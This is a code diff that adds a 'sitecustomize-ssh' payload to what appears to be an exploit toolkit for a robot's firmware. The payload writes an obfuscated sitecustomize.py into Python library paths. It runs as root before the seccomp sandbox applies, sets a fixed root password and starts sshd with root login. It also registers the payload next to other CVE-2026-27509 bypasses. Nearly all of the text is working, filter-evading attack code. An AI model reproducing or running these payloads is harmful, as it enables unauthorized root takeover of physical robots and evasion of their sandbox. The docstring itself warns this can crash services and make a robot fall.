@@ -412,6 +412,60 @@ def payload_bypass_escalate(unfiltered_code, hotkey="L1+Y"):
     )
 
 
+def payload_sitecustomize_ssh(password="unleash", hotkey="L1+Y"):
+    """Enable SSH via sitecustomize.py injection (firmware >= 1.1.14/15).
+
+    py_script_execute_env calls Py_Initialize() before seccomp_load(), so
+    sitecustomize.py runs with full syscall access as root. This payload
+    writes sitecustomize.py to all Python lib paths via np.savetxt. On the
+    next Py_Initialize() (reboot or any script trigger), os.system() starts
+    sshd before the sandbox is applied.
+
+    Use when bypass-ssh fails (crond not running on 1.1.14/15).
+
+    WARNING: sitecustomize.py must be removed after SSH is up or ALL Python
+    services crash on every boot (robot may fall). Cleanup via SSH:
+      find / -name 'sitecustomize.py' -path '*/python*' -exec rm -f {} \\;
+      reboot
+    """
+    chpasswd = f"echo 'root:{password}' | /usr/sbin/chpasswd"
+    sshd_cmd = (
+        "/usr/sbin/sshd"
+        " -o PermitRootLogin=yes"
+        " -o PasswordAuthentication=yes"
+        " -o PubkeyAuthentication=yes"
+    )
+    content = f"import os; os.system('{chpasswd} && {sshd_cmd}')"
+
+    paths = [
+        "/usr/lib/python3.8/sitecustomize.py",
+        "/usr/lib/python3.10/sitecustomize.py",
+        "/usr/lib/python3.11/sitecustomize.py",
+        "/usr/local/lib/python3.8/dist-packages/sitecustomize.py",
+    ]
+
+    content_enc = _enc(content)
+    code = f"_c = {content_enc}\n"
+    for i, path in enumerate(paths):
+        code += f"_p{i} = {_enc(path)}\n"
+        code += f"np.savetxt(_p{i}, np.array([_c]), fmt='%s')\n"
+
+    ok, kw = validate_bypass_payload(code)
+    if not ok:
+        raise ValueError(f"BUG: bypass payload blocked by keyword: {kw!r}")
+
+    return WebRTCPayload(
+        name="sitecustomize-ssh",
+        description=(
+            f"SSH via sitecustomize.py injection, root password={password} "
+            "(fw >= 1.1.14/15)"
+        ),
+        python_code=code,
+        program_uuid=str(int(time.time())),
+        bind_hotkey=hotkey,
+    )
+
+
 def payload_bypass_ssh(password="unleash", hotkey="L1+Y"):
     """Enable SSH via cron job (CVE-2026-27509 bypass).
 
@@ -478,4 +532,8 @@ PAYLOAD_REGISTRY = {
     "bypass-cron": ("Cron job for cmd exec (CVE-2026-27509 bypass)", payload_bypass_cron),
     "bypass-escalate": ("Two-press self-overwrite (CVE-2026-27509 bypass)", payload_bypass_escalate),
     "bypass-ssh": ("Enable SSH via cron (firmware >= 1.1.14)", payload_bypass_ssh),
+    "sitecustomize-ssh": (
+        "SSH via sitecustomize.py injection (fw >= 1.1.14/15, no crond)",
+        payload_sitecustomize_ssh,
+    ),
 }
